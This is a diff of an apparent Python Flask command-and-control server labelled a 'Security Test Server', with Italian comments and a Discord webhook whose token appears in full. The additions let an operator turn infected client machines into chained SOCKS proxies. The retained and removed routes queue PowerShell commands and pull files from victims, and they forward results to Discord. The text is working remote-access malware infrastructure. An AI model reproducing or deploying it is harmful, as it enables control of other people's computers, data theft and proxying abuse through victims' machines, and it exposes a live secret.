@@ -11,7 +11,7 @@ app = Flask(__name__)
 
 # Configurazione Discord
 DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1435284134162464900/avJVpeaibF4iQyUlrD73-2JFZvpmNtZWeX-Cmbot3QU3tadH1wxjuOuZ-c7f9FsckPSt"
-CURRENT_VERSION = "1.2.0"
+CURRENT_VERSION = "1.3.0"  # 🆕 Versione con SOCKS proxy chain
 
 class ClientManager:
     def __init__(self):
@@ -105,10 +105,10 @@ def home():
     clients_count = len(client_manager.list_clients())
     return f"""
     <h1>Security Test Server v{CURRENT_VERSION}</h1>
-    <p>PythonAnywhere + Discord</p>
+    <p>PythonAnywhere + Discord + SOCKS Proxy</p>
     <p>Client connessi: {clients_count}</p>
     <p><a href="/admin">Admin Panel</a></p>
-    <p><a href="/upload_files">Upload Files to Clients</a></p>
+    <p><a href="/proxy_control">🔌 Proxy Control</a></p>
     <p><a href="/api/clients">API Clients</a></p>
     """
 
@@ -165,19 +165,186 @@ def admin_panel():
         <button type="submit">Download File from Client</button>
     </form>
 
+    <p><a href="/proxy_control">🔌 SOCKS Proxy Control</a></p>
     <p><a href="/upload_files">📤 Upload Files to Clients</a></p>
     <p><a href="/api/clients">View All Clients (JSON)</a></p>
     '''
 
+# 🆕 PROXY CONTROL PANEL
+@app.route('/proxy_control')
+def proxy_control():
+    clients = client_manager.list_clients()
+    clients_html = ""
+    for client_id, info in clients.items():
+        clients_html += f'<option value="{client_id}">Client {client_id} - {info["data"].get("hostname", "Unknown")} ({info["ip"]})</option>'
+    
+    return f'''
+    <h2>🔌 SOCKS Proxy Control v{CURRENT_VERSION}</h2>
+    
+    <h3>🚀 Start SOCKS Proxy</h3>
+    <form action="/api/start_socks_proxy" method="post">
+        <label>Select Client:</label>
+        <select name="client_id">
+            {clients_html}
+        </select><br>
+        
+        <label>Port (default 1080):</label>
+        <input type="number" name="port" value="1080"><br>
+        
+        <label>Next Hop (for proxy chain - optional):</label>
+        <input type="text" name="next_hop" placeholder="192.168.1.100" style="width: 200px;"><br><br>
+        
+        <button type="submit">Start SOCKS Proxy</button>
+    </form>
+
+    <h3>🛑 Stop SOCKS Proxy</h3>
+    <form action="/api/stop_socks_proxy" method="post">
+        <label>Select Client:</label>
+        <select name="client_id">
+            {clients_html}
+        </select><br><br>
+        <button type="submit">Stop SOCKS Proxy</button>
+    </form>
+
+    <h3>🌐 Test Proxy Chain</h3>
+    <form action="/api/test_proxy_chain" method="post">
+        <label>PC1 (First Hop):</label>
+        <select name="pc1_id">
+            {clients_html}
+        </select><br>
+        
+        <label>PC2 (Second Hop):</label>
+        <select name="pc2_id">
+            {clients_html}
+        </select><br><br>
+        
+        <button type="submit">Test Proxy Chain</button>
+    </form>
+
+    <h3>🔍 Get Client IP</h3>
+    <form action="/api/get_client_ip" method="post">
+        <label>Select Client:</label>
+        <select name="client_id">
+            {clients_html}
+        </select><br><br>
+        <button type="submit">Get Public IP</button>
+    </form>
+
+    <p><a href="/admin">Back to Admin</a></p>
+    '''
+
+# 🆕 PROXY API ENDPOINTS
+@app.route('/api/start_socks_proxy', methods=['POST'])
+def start_socks_proxy():
+    client_id = request.form.get('client_id')
+    port = request.form.get('port', 1080)
+    next_hop = request.form.get('next_hop')
+    
+    if client_id:
+        command = f"start_socks|{port}|{next_hop}" if next_hop else f"start_socks|{port}"
+        client_manager.add_command(int(client_id), command)
+        send_to_discord(f"🔌 SOCKS proxy avviato su client {client_id}" + (f" -> {next_hop}" if next_hop else ""))
+    
+    return f'''
+    <h3>SOCKS Proxy Started!</h3>
+    <p>Client: {client_id}</p>
+    <p>Port: {port}</p>
+    <p>Next Hop: {next_hop if next_hop else 'Direct'}</p>
+    <a href="/proxy_control">Back to Proxy Control</a>
+    '''
+
+@app.route('/api/stop_socks_proxy', methods=['POST'])
+def stop_socks_proxy():
+    client_id = request.form.get('client_id')
+    
+    if client_id:
+        client_manager.add_command(int(client_id), "stop_socks")
+        send_to_discord(f"🛑 SOCKS proxy fermato su client {client_id}")
+    
+    return f'''
+    <h3>SOCKS Proxy Stopped!</h3>
+    <p>Client: {client_id}</p>
+    <a href="/proxy_control">Back to Proxy Control</a>
+    '''
+
+@app.route('/api/get_client_ip', methods=['POST'])
+def get_client_ip():
+    client_id = request.form.get('client_id')
+    
+    if client_id:
+        client_manager.add_command(int(client_id), "get_public_ip")
+        send_to_discord(f"🔍 Richiesto IP pubblico per client {client_id}")
+    
+    return f'''
+    <h3>IP Request Sent!</h3>
+    <p>Client: {client_id}</p>
+    <p>Check Discord for results</p>
+    <a href="/proxy_control">Back to Proxy Control</a>
+    '''
+
+@app.route('/api/test_proxy_chain', methods=['POST'])
+def test_proxy_chain():
+    pc1_id = request.form.get('pc1_id')
+    pc2_id = request.form.get('pc2_id')
+    
+    if pc1_id and pc2_id:
+        # Start PC2 as direct proxy
+        client_manager.add_command(int(pc2_id), "start_socks|1080")
+        
+        # Start PC1 as chain proxy to PC2
+        pc2_data = client_manager.get_client(int(pc2_id))
+        if pc2_data:
+            pc2_ip = pc2_data['ip']
+            client_manager.add_command(int(pc1_id), f"start_socks|1080|{pc2_ip}")
+            
+            send_to_discord(f"🔗 Proxy chain avviata: PC1 ({pc1_id}) -> PC2 ({pc2_id})")
+            
+            return f'''
+            <h3>Proxy Chain Started!</h3>
+            <p>PC1: {pc1_id} -> PC2: {pc2_id}</p>
+            <p>Chain: PythonAnywhere → PC1 → PC2 → Internet</p>
+            <a href="/proxy_control">Back to Proxy Control</a>
+            '''
+    
+    return "Error: Clients not found"
+
+# 🆕 GOOGLE ACCESS THROUGH PROXY CHAIN
+@app.route('/access_google/<int:pc1_id>/<int:pc2_id>')
+def access_google(pc1_id, pc2_id):
+    """Access Google through proxy chain"""
+    try:
+        pc1_data = client_manager.get_client(pc1_id)
+        pc2_data = client_manager.get_client(pc2_id)
+        
+        if not pc1_data or not pc2_data:
+            return "Error: Clients not found"
+        
+        pc1_ip = pc1_data['ip']
+        
+        # Use PC1 as SOCKS proxy (which chains to PC2)
+        proxies = {
+            'http': f'socks5://{pc1_ip}:1080',
+            'https': f'socks5://{pc1_ip}:1080'
+        }
+        
+        # Access Google through the proxy chain
+        response = requests.get('https://www.google.com', proxies=proxies, timeout=30)
+        
+        return response.text
+        
+    except Exception as e:
+        return f"Error accessing Google through proxy chain: {str(e)}"
+
+# RESTANTE CODICE SERVER INVARIATO...
 @app.route('/send_command', methods=['POST'])
 def send_command_web():
     client_id = request.form.get('client_id')
     command = request.form.get('command')
-    
+
     if client_id and command:
         client_manager.add_command(int(client_id), command)
         send_to_discord(f"🌐 Comando web '{command}' per client {client_id}")
-    
+
     return f'''
     <h3>Command Sent!</h3>
     <p>Command: {command} to Client: {client_id}</p>
@@ -188,12 +355,12 @@ def send_command_web():
 def send_powershell():
     client_id = request.form.get('client_id')
     powershell_command = request.form.get('powershell_command')
-    
+
     if client_id and powershell_command:
         command = f"powershell_live:{powershell_command}"
         client_manager.add_command(int(client_id), command)
         send_to_discord(f"⚡ PowerShell: {powershell_command[:100]}... per client {client_id}")
-    
+
     return f'''
     <h3>PowerShell Command Sent!</h3>
     <p>Command: {powershell_command}</p>
@@ -203,217 +370,4 @@ def send_powershell():
 
 @app.route('/download_file', methods=['POST'])
 def download_file():
-    client_id = request.form.get('client_id')
-    file_path = request.form.get('file_path')
-    
-    if client_id and file_path:
-        command = f"download_file:{file_path}"
-        client_manager.add_command(int(client_id), command)
-        send_to_discord(f"📥 Download richiesto: {file_path} da client {client_id}")
-    
-    return f'''
-    <h3>Download Request Sent!</h3>
-    <p>File: {file_path}</p>
-    <p>From Client: {client_id}</p>
-    <a href="/admin">Back to Admin</a>
-    '''
-
-@app.route('/api/upload_file', methods=['POST'])
-def upload_file():
-    """Riceve file uploadati dal client"""
-    try:
-        client_id = request.form.get('client_id')
-        file_path = request.form.get('file_path')
-        
-        if 'file' not in request.files:
-            return jsonify({"status": "error", "message": "No file uploaded"})
-        
-        file = request.files['file']
-        safe_filename = os.path.basename(file_path) if file_path else f"upload_{client_id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.dat"
-        
-        uploads_dir = "uploads"
-        os.makedirs(uploads_dir, exist_ok=True)
-        
-        file.save(os.path.join(uploads_dir, safe_filename))
-        
-        send_to_discord(f"📤 File uploadato da client {client_id}: {safe_filename}")
-        
-        return jsonify({"status": "success", "message": f"File {safe_filename} uploaded"})
-        
-    except Exception as e:
-        return jsonify({"status": "error", "message": str(e)})
-
-@app.route('/api/check_update', methods=['GET'])
-def check_update():
-    client_version = request.args.get('version', '1.0.0')
-    
-    if client_version != CURRENT_VERSION:
-        return jsonify({
-            "status": "update_available",
-            "current_version": CURRENT_VERSION,
-            "message": "New version available"
-        })
-    else:
-        return jsonify({
-            "status": "up_to_date", 
-            "message": "Client is up to date"
-        })
-
-@app.route('/api/register', methods=['POST'])
-def register_client():
-    try:
-        client_data = request.json
-        client_ip = request.remote_addr
-        client_id = client_manager.add_client(client_data, client_ip)
-        
-        send_to_discord(f"🟢 Client {client_id} registrato - {client_data.get('hostname', 'Unknown')}")
-        
-        return jsonify({
-            "status": "success",
-            "client_id": client_id,
-            "message": "Client registered successfully"
-        })
-    except Exception as e:
-        return jsonify({"status": "error", "message": str(e)})
-
-@app.route('/api/check_commands', methods=['GET'])
-def check_commands():
-    try:
-        client_id = request.args.get('client_id')
-        
-        if not client_id:
-            return jsonify({"status": "error", "message": "client_id required"})
-        
-        command = client_manager.get_command(int(client_id))
-        
-        return jsonify({
-            "status": "success",
-            "command": command,
-            "message": "Command check completed"
-        })
-        
-    except Exception as e:
-        return jsonify({"status": "error", "message": str(e)})
-
-@app.route('/api/results', methods=['POST'])
-def receive_results():
-    try:
-        data = request.json
-        client_id = data.get('client_id')
-        command = data.get('command')
-        results = data.get('results')
-        
-        # Invia risultati a Discord (primi 1500 caratteri per limiti Discord)
-        results_preview = str(results)[:1500]
-        send_to_discord(f"📊 Risultati da client {client_id} - {command}:\n```{results_preview}```")
-        
-        # Salva risultati completi
-        filename = f"results_{client_id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
-        with open(filename, 'w') as f:
-            json.dump(data, f, indent=2)
-        
-        return jsonify({"status": "success", "message": "Results received"})
-        
-    except Exception as e:
-        return jsonify({"status": "error", "message": str(e)})
-
-@app.route('/api/clients', methods=['GET'])
-def list_clients():
-    clients = client_manager.list_clients()
-    return jsonify({
-        "status": "success",
-        "clients": {
-            cid: {
-                "data": info["data"],
-                "last_seen": info["last_seen"].isoformat(),
-                "ip": info["ip"],
-                "fingerprint": info.get("fingerprint", "unknown")
-            } for cid, info in clients.items()
-        }
-    })
-
-@app.route('/api/available_files', methods=['GET'])
-def available_files():
-    try:
-        files_dir = "uploads"
-        available = []
-        if os.path.exists(files_dir):
-            for filename in os.listdir(files_dir):
-                file_path = os.path.join(files_dir, filename)
-                if os.path.isfile(file_path):
-                    available.append({
-                        "name": filename,
-                        "size": os.path.getsize(file_path),
-                        "modified": os.path.getmtime(file_path)
-                    })
-        return jsonify({"status": "success", "files": available})
-    except Exception as e:
-        return jsonify({"status": "error", "message": str(e)})
-
-@app.route('/api/download_file/<filename>', methods=['GET'])
-def download_file_server(filename):
-    try:
-        safe_filename = os.path.basename(filename)
-        return send_file(f"uploads/{safe_filename}", as_attachment=True)
-    except:
-        return jsonify({"status": "error", "message": "File not found"})
-
-@app.route('/upload_files')
-def upload_files_interface():
-    clients = client_manager.list_clients()
-    clients_html = ""
-    for client_id, info in clients.items():
-        clients_html += f'<option value="{client_id}">Client {client_id} - {info["data"].get("hostname", "Unknown")}</option>'
-    
-    available_files = []
-    try:
-        files_dir = "uploads"
-        if os.path.exists(files_dir):
-            available_files = [f for f in os.listdir(files_dir) if os.path.isfile(os.path.join(files_dir, f))]
-    except:
-        pass
-    
-    files_html = ""
-    for file in available_files[:10]:
-        files_html += f'<option value="{file}">{file}</option>'
-    
-    return f'''
-    <h2>📤 Upload File to Clients</h2>
-    <form action="/send_upload_command" method="post">
-        <label>Select Client:</label>
-        <select name="client_id">{clients_html}</select><br><br>
-        <label>Select File:</label>
-        <select name="filename">{files_html}</select><br><br>
-        <label>Destination Path:</label>
-        <input type="text" name="destination" value="C:\\temp\\" style="width: 300px;"><br><br>
-        <button type="submit">📤 Upload File to Client</button>
-    </form>
-    <p><a href="/admin">Back to Admin</a></p>
-    '''
-
-@app.route('/send_upload_command', methods=['POST'])
-def send_upload_command():
-    client_id = request.form.get('client_id')
-    filename = request.form.get('filename')
-    destination = request.form.get('destination')
-    
-    if client_id and filename and destination:
-        command = f"upload_file|{filename}|{destination}"
-        client_manager.add_command(int(client_id), command)
-        send_to_discord(f"📤 Upload richiesto: {filename} → {destination} su client {client_id}")
-    
-    return f'''
-    <h3>Upload Command Sent!</h3>
-    <p>File: {filename}</p>
-    <p>Destination: {destination}</p>
-    <p>To Client: {client_id}</p>
-    <a href="/upload_files">Back to Upload</a>
-    '''
-    
-if __name__ == '__main__':
-    port = int(os.environ.get('PORT', 5000))
-    os.makedirs("uploads", exist_ok=True)
-    os.makedirs("downloads", exist_ok=True)
-    
-    send_to_discord(f"🚀 Server v{CURRENT_VERSION} avviato su PythonAnywhere")
-    app.run(host='0.0.0.0', port=port, debug=False)
+    client_id = request.form
